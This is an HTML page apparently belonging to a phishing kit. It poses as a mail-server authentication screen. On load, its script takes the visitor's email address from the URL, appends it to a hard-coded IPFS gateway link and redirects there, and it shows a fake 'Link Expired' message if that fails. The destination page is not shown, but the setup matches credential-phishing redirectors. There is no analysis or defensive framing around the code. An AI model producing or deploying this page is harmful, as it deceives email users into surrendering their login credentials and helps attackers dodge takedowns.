<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>AUTHENTICATING Mail SERVER...</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin-top: 50px;
      }
    </style>
    <script>
      async function checkAndRedirect() {
        const params = new URLSearchParams(window.location.search);
        const email = params.get("email") || "unknown@example.com";
        const encodedEmail = encodeURIComponent(email);

        const ipfsURL = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${encodedEmail}`;

        try {
          // Check if IPFS page is reachable
          const response = await fetch(ipfsURL, { method: 'HEAD', mode: 'no-cors' });
          // Redirect anyway; fetch with no-cors won't throw unless completely unreachable
          window.location.href = ipfsURL;
        } catch (error) {
          // Show "Link Expired" if it fails
          document.body.innerHTML = `<h1>Link Expired</h1><p>The page is no longer available.</p>`;
        }
      }

      window.onload = checkAndRedirect;
    </script>
  </head>
  <body>
    <p>AUTHENTICATING SERVER...</p>
  </body>
</html>
